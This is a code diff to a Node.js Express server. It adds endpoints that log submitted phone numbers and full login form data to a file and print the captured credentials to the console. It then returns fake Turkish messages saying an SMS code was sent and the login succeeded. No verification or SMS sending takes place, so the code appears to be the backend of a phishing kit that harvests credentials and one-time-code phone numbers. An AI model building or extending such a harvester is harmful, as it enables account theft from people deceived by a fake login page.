@@ -40,7 +40,50 @@ app.post('/api/register', (req, res) => {
     fs.writeFileSync(logFile, JSON.stringify(logs, null, 2));
 
     res.status(200).json({
-        message: 'Connection successful. Please wait while we redirect you.',
+        message: 'Registration successful. Redirecting to login...',
+        status: 'success'
+    });
+});
+
+app.post('/api/request-code', (req, res) => {
+    const { phone } = req.body;
+    const timestamp = new Date().toISOString();
+    const entry = { timestamp, type: 'CODE_REQUEST', phone };
+
+    console.log(`--- SMS CODE REQUESTED FOR: ${phone} ---`);
+
+    let logs = [];
+    if (fs.existsSync(logFile)) {
+        const fileContent = fs.readFileSync(logFile, 'utf-8');
+        try { logs = JSON.parse(fileContent); } catch (e) { logs = []; }
+    }
+    logs.push(entry);
+    fs.writeFileSync(logFile, JSON.stringify(logs, null, 2));
+
+    res.status(200).json({
+        message: 'SMS kodu gönderildi.',
+        status: 'success'
+    });
+});
+
+app.post('/api/login', (req, res) => {
+    const loginData = req.body;
+    const timestamp = new Date().toISOString();
+    const entry = { timestamp, type: 'LOGIN_ATTEMPT', ...loginData };
+
+    console.log('--- NEW LOGIN ATTEMPT CAPTURED ---');
+    console.table(loginData);
+
+    let logs = [];
+    if (fs.existsSync(logFile)) {
+        const fileContent = fs.readFileSync(logFile, 'utf-8');
+        try { logs = JSON.parse(fileContent); } catch (e) { logs = []; }
+    }
+    logs.push(entry);
+    fs.writeFileSync(logFile, JSON.stringify(logs, null, 2));
+
+    res.status(200).json({
+        message: 'Giriş başarılı. Sisteme yönlendiriliyorsunuz.',
         status: 'success'
     });
 });
